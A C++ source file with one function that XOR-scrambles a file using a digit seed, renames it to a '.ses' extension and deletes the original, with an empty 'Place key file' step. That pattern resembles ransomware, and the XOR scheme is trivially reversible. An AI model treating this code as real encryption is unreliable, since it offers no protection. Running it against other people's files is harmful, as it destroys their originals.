#include "Encrypt.h"

void encrypt::encryptFile(const std::filesystem::path& filePath, const std::string& seed, bool recursive = false) {
	std::cout << "Encrypting file: " << filePath << std::endl;

	// Get original file extension
	std::string originalExtension = filePath.extension().string();

	// Open the file for reading
	std::ifstream inputFile(filePath, std::ios::binary);
	if (!inputFile) {
		std::cerr << "Error opening file for reading : " << filePath << std::endl;
		return;
	}

	// Read file content into buffer
	std::vector<char> buffer((std::istreambuf_iterator<char>(inputFile)), std::istreambuf_iterator<char>());
	inputFile.close();

	// Prepend the original extension to the buffer with a null term
	buffer.insert(buffer.begin(), originalExtension.begin(), originalExtension.end());
	buffer.insert(buffer.begin() + originalExtension.size(), '\0');

	// Flip bits according to seed
	for (size_t i = 0; i < buffer.size(); ++i) {
		int flipTimes = seed[i % seed.size()] - '0'; // Convert char digit to int
		buffer[i] ^= flipTimes; // XOR operation for encryption
	}

	// Change file extension to .ses
	std::filesystem::path newFilePath = filePath;
	newFilePath.replace_extension(".ses");

	// Write encrypted contents back to file with new extension
	std::ofstream outputFile(newFilePath, std::ios::binary);
	if (!outputFile) {
		std::cerr << "Error opening file for writing: " << filePath << std::endl;
		return;
	}
	outputFile.write(buffer.data(), buffer.size());
	outputFile.close();

	// Delete the original file
	std::filesystem::remove(filePath);

	// Place key file

	std::cout << "Successfully encrypted: " << newFilePath << std::endl;
}
